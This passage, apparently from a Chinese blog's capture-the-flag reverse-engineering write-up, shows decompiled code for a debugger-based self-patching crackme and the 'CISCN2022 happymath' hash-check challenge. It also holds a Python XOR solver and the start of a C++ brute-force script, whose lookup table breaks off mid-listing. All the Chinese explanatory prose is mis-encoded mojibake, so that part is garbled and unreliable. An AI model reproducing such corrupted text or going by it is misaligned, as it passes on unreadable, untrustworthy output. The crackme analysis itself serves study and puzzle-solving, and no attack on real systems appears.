class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v11 );</span><br><span class="line">  v12 = v10 - this;</span><br><span class="line">  v13 = v25;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = v13[<span class="number">1</span>];</span><br><span class="line">    ++v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v14 );</span><br><span class="line">  qmemcpy(v13, this, v12);</span><br><span class="line">  CreateProcessW(<span class="number">0</span>, CommandLine, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  <span class="keyword">while</span> ( DebugEvent.dwDebugEventCode != <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">    WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  LOWORD(Buffer[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  Context.ContextFlags = <span class="number">65537</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  GetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">  v22[<span class="number">0</span>] = <span class="number">344606352</span>;</span><br><span class="line">  v22[<span class="number">1</span>] = <span class="number">252981262</span>;</span><br><span class="line">  v22[<span class="number">2</span>] = <span class="number">1976056641</span>;</span><br><span class="line">  v23 = <span class="number">-11</span>;</span><br><span class="line">  WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)(Context.Eip - <span class="number">1</span>), v22, <span class="number">0xD</span>u, &amp;NumberOfBytesWritten);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  LOWORD(Buffer[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  <span class="keyword">if</span> ( Buffer[<span class="number">0</span>] == <span class="number">727473189</span> &amp;&amp; Buffer[<span class="number">1</span>] == <span class="number">907631919</span> &amp;&amp; Buffer[<span class="number">2</span>] == <span class="number">1987208236</span> )</span><br><span class="line">    <span class="keyword">return</span> -(Buffer[<span class="number">3</span>] != <span class="number">1380869760</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹åªåœ¨æœ€å13è¡Œï¼Œå‰é¢éƒ½æ˜¯åˆå§‹åŒ–ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WriteProcessMemory(ProcessInformation.hProcess, (LPVOID)(Context.Eip - <span class="number">1</span>), v22, <span class="number">0xD</span>u, &amp;NumberOfBytesWritten);</span><br><span class="line">  ContinueDebugEvent(ProcessInformation.dwProcessId, ProcessInformation.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">  WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  LOWORD(Buffer[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  ReadProcessMemory(</span><br><span class="line">    ProcessInformation.hProcess,</span><br><span class="line">    DebugEvent.u.CreateThread.hThread,</span><br><span class="line">    Buffer,</span><br><span class="line">    DebugEvent.u.DebugString.nDebugStringLength,</span><br><span class="line">    &amp;NumberOfBytesRead);</span><br><span class="line">  <span class="keyword">if</span> ( Buffer[<span class="number">0</span>] == <span class="number">727473189</span> &amp;&amp; Buffer[<span class="number">1</span>] == <span class="number">907631919</span> &amp;&amp; Buffer[<span class="number">2</span>] == <span class="number">1987208236</span> )</span><br><span class="line">    <span class="keyword">return</span> -(Buffer[<span class="number">3</span>] != <span class="number">1380869760</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ€åçš„è¾“å‡ºæ¡ä»¶ï¼ŒåŒæ—¶å®ƒæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°è¿›ç¨‹ã€‚å¹¶æŠŠè¾“å…¥ä½œä¸ºå‚æ•°ä¸€èµ·æ‰“å¼€ï¼Œç„¶åç”¨WaitForDebugEventæ¥è¯»å–è°ƒè¯•ï¼Œè¯»å–åˆ°åpatchåé¢çš„å‡ ä¸ªå­—èŠ‚ï¼Œåœ°æ–¹æ˜¯Context.Eip - 1ï¼Œä¹Ÿå°±æ˜¯ç¨‹åºæ‰§è¡Œåˆ°çš„ä½ç½®ï¼Œåˆšåˆšçš„mainå‡½æ•°é‡Œé¢åˆšå¥½å°±æœ‰ä¸€ä¸ªint3æ–­ç‚¹ï¼Œåœ¨é‚£é‡Œç›´æ¥patchå¾—åˆ°æœ€åçš„é€»è¾‘</p><p><img src="https://s2.loli.net/2024/08/05/8Q9namgWbVYdZ7S.png" alt="img"></p><p>æ‰€ä»¥åªæ˜¯ä¸€ä¸ªå¼‚æˆ–ç„¶åä¸€ä¸ªåŠ å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">0x25</span>,<span class="number">0x5c</span>,<span class="number">0x5c</span>,<span class="number">0x2b</span>,<span class="number">0x2f</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x36</span>,<span class="number">0x2c</span>,<span class="number">0x64</span>,<span class="number">0x72</span>,<span class="number">0x76</span>,<span class="number">0x80</span>,<span class="number">0x66</span>,<span class="number">0x4e</span>,<span class="number">0x52</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    last[i]-=<span class="number">1</span></span><br><span class="line">s = <span class="string">&#x27;elcome to CFF test!&#x27;</span></span><br><span class="line">pxor(last,s)</span><br></pre></td></tr></table></figure><h3 id="CISCN2022-happymath">CISCN2022 happymath</h3><p>è¿›å»ç›´æ¥çœ‹mainï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%32s&quot;</span>, input);</span><br><span class="line">  len = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++len;</span><br><span class="line">  <span class="keyword">while</span> ( input[len] );</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)len == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    j = <span class="number">0</span>i64;</span><br><span class="line">    k = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = input[k];</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v6 - <span class="string">&#x27;a&#x27;</span>) &gt; <span class="number">5u</span> &amp;&amp; (<span class="type">unsigned</span> __int8)(v6 - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++k &gt;= <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        n = <span class="number">0</span>i64;</span><br><span class="line">        m = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sk = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">for</span> ( i = j; i &lt; m; sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>) )</span><br><span class="line">            mid = input[i++];</span><br><span class="line">          v12 = (sk | ~*(_DWORD *)((<span class="type">char</span> *)&amp;t2 + j)) &amp; ~(sk &amp; ~*(_DWORD *)((<span class="type">char</span> *)&amp;t2 + j));</span><br><span class="line">          v13 = ((((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">16</span>) | ((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">          v14 = ((v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>))) &gt;&gt; <span class="number">1</span>) | v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">          v15 = (((v14 &gt;&gt; <span class="number">2</span>) | v14) &gt;&gt; <span class="number">4</span>) | (v14 &gt;&gt; <span class="number">2</span>) | v14;</span><br><span class="line">          v16 = (((v15 &gt;&gt; <span class="number">8</span>) | v15) &gt;&gt; <span class="number">16</span>) | (v15 &gt;&gt; <span class="number">8</span>) | v15;</span><br><span class="line">          v17 = (<span class="number">4</span> * ((<span class="number">2</span> * v16) | v16)) | (<span class="number">2</span> * v16) | v16;</span><br><span class="line">          v18 = (((<span class="number">16</span> * v17) | v17) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v17) | v17;</span><br><span class="line">          v19 = (<span class="number">4</span> * ((<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>)) | (<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>;</span><br><span class="line">          v20 = (((<span class="number">16</span> * v19) | v19) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v19) | v19;</span><br><span class="line">          <span class="keyword">if</span> ( ((v20 | (v20 &lt;&lt; <span class="number">16</span>)) &amp; (~((v18 &lt;&lt; <span class="number">16</span>) | v18) | v18 &amp; <span class="number">1</span>)) != <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          m += <span class="number">4</span>;</span><br><span class="line">          n += <span class="number">256</span>i64;</span><br><span class="line">          j += <span class="number">4</span>i64;</span><br><span class="line">          <span class="keyword">if</span> ( m &gt;= <span class="number">36</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            sub_7FF6471D1020(<span class="string">&quot;Your flag is flag&#123;%s&#125;\n&quot;</span>, input);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF6471D1020(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = j; i &lt; m; sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>) )</span><br><span class="line">mid = input[i++];</span><br><span class="line"><span class="comment">//æ”¹å†™ä¸º</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mid = input[i];</span><br><span class="line">sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œæ¯å››ä¸ªå­—èŠ‚ç”¨t1è¡¨ç”Ÿæˆæ¯æ¬¡çš„å¯†é’¥skï¼Œç”Ÿæˆåªå’Œè¾“å…¥å’Œnæœ‰å…³ï¼Œæ ¡éªŒåªå’Œskæœ‰å…³ã€‚é‚£ä¹ˆç›´æ¥å†™çˆ†ç ´è„šæœ¬ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> t1[<span class="number">2048</span>] = &#123;</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0xF26B8303</span>, <span class="number">0xE13B70F7</span>, <span class="number">0x1350F3F4</span>, <span class="number">0xC79A971F</span>, <span class="number">0x35F1141C</span>, <span class="number">0x26A1E7E8</span>, <span class="number">0xD4CA64EB</span>,</span><br><span class="line"><span class="number">0x8AD958CF</span>, <span class="number">0x78B2DBCC</span>, <span class="number">0x6BE22838</span>, <span class="number">0x9989AB3B</span>, <span class="number">0x4D43CFD0</span>, <span class="number">0xBF284CD3</span>, <span class="number">0xAC78BF27</span>, <span class="number">0x5E133C24</span>,</span><br><span class="line"><span class="number">0x105EC76F</span>, <span class="number">0xE235446C</span>, <span class="number">0xF165B798</span>, <span class="number">0x030E349B</span>, <span class="number">0xD7C45070</span>, <span class="number">0x25AFD373</span>, <span class="number">0x36FF2087</span>, <span class="number">0xC494A384</span>,</span><br><span class="line"><span class="number">0x9A879FA0</span>, <span class="number">0x68EC1CA3</span>, <span class="number">0x7BBCEF57</span>, <span class="number">0x89D76C54</span>, <span class="number">0x5D1D08BF</span>, <span class="number">0xAF768BBC</span>, <span class="number">0xBC267848</span>, <span class="number">0x4E4DFB4B</span>,</span><br><span class="line"><span class="number">0x20BD8EDE</span>, <span class="number">0xD2D60DDD</span>, <span class="number">0xC186FE29</span>, <span class="number">0x33ED7D2A</span>, <span class="number">0xE72719C1</span>, <span class="number">0x154C9AC2</span>, <span class="number">0x061C6936</span>, <span class="number">0xF477EA35</span>,</span><br><span class="line"><span class="number">0xAA64D611</span>, <span class="number">0x580F5512</span>, <span class="number">0x4B5FA6E6</span>, <span class="number">0xB93425E5</span>, <span class="number">0x6DFE410E</span>, <span class="number">0x9F95C20D</span>, <span class="number">0x8CC531F9</span>, <span class="number">0x7EAEB2FA</span>,</span><br><span class="line"><span class="number">0x30E349B1</span>, <span class="number">0xC288CAB2</span>, <span class="number">0xD1D83946</span>, <span class="number">0x23B3BA45</span>, <span class="number">0xF779DEAE</span>, <span class="number">0x05125DAD</span>, <span class="number">0x1642AE59</span>, <span class="number">0xE4292D5A</span>,</span><br><span class="line"><span class="number">0xBA3A117E</span>, <span class="number">0x4851927D</span>, <span class="number">0x5B016189</span>, <span class="number">0xA96AE28A</span>, <span class="number">0x7DA08661</span>, <span class="number">0x8FCB0562</span>, <span class="number">0x9C9BF696</span>, <span class="number">0x6EF07595</span>,</span><br><span class="line"><span class="number">0x417B1DBC</span>, <span class="number">0xB3109EBF</span>, <span class="number">0xA0406D4B</span>, <span class="number">0x522BEE48</span>, <span class="number">0x86E18AA3</span>, <span class="number">0x748A09A0</span>, <span class="number">0x67DAFA54</span>, <span class="number">0x95B17957</span>,</span><br><span class="line"><span class="number">0xCBA24573</span>, <span class="number">0x39C9C670</span>, <span class="number">0x2A993584</span>, <span class="number">0xD8F2B687</span>, <span class="number">0x0C38D26C</span>, <span class="number">0xFE53516F</span>, <span class="number">0xED03A29B</span>, <span class="number">0x1F682198</span>,</span><br><span class="line"><span class="number">0x5125DAD3</span>, <span class="number">0xA34E59D0</span>, <span class="number">0xB01EAA24</span>, <span class="number">0x42752927</span>, <span class="number">0x96BF4DCC</span>, <span class="number">0x64D4CECF</span>, <span class="number">0x77843D3B</span>, <span class="number">0x85EFBE38</span>,</span><br><span class="line"><span class="number">0xDBFC821C</span>, <span class="number">0x2997011F</span>, <span class="number">0x3AC7F2EB</span>, <span class="number">0xC8AC71E8</span>, <span class="number">0x1C661503</span>, <span class="number">0xEE0D9600</span>, <span class="number">0xFD5D65F4</span>, <span class="number">0x0F36E6F7</span>,</span><br><span class="line"><span class="number">0x61C69362</span>, <span class="number">0x93AD1061</span>, <span class="number">0x80FDE395</span>, <span class="number">0x72966096</span>, <span class="number">0xA65C047D</span>, <span class="number">0x5437877E</span>, <span class="number">0x4767748A</span>, <span class="number">0xB50CF789</span>,</span><br><span class="line"><span class="number">0xEB1FCBAD</span>, <span class="number">0x197448AE</span>, <span class="number">0x0A24BB5A</span>, <span class="number">0xF84F3859</span>, <span class="number">0x2C855CB2</span>, <span class="number">0xDEEEDFB1</span>, <span class="number">0xCDBE2C45</span>, <span class="number">0x3FD5AF46</span>,</span><br><span class="line"><span class="number">0x7198540D</span>, <span class="number">0x83F3D70E</span>, <span class="number">0x90A324FA</span>, <span class="number">0x62C8A7F9</span>, <span class="number">0xB602C312</span>, <span class="number">0x44694011</span>, <span class="number">0x5739B3E5</span>, <span class="number">0xA55230E6</span>,</span><br><span class="line"><span class="number">0xFB410CC2</span>, <span class="number">0x092A8FC1</span>, <span class="number">0x1A7A7C35</span>, <span class="number">0xE811FF36</span>, <span class="number">0x3CDB9BDD</span>, <span class="number">0xCEB018DE</span>, <span class="number">0xDDE0EB2A</span>, <span class="number">0x2F8B6829</span>,</span><br><span class="line"><span class="number">0x82F63B78</span>, <span class="number">0x709DB87B</span>, <span class="number">0x63CD4B8F</span>, <span class="number">0x91A6C88C</span>, <span class="number">0x456CAC67</span>, <span class="number">0xB7072F64</span>, <span class="number">0xA457DC90</span>, <span class="number">0x563C5F93</span>,</span><br><span class="line"><span class="number">0x082F63B7</span>, <span class="number">0xFA44E0B4</span>, <span class="number">0xE9141340</span>, <span class="number">0x1B7F9043</span>, <span class="number">0xCFB5F4A8</span>, <span class="number">0x3DDE77AB</span>, <span class="number">0x2E8E845F</span>, 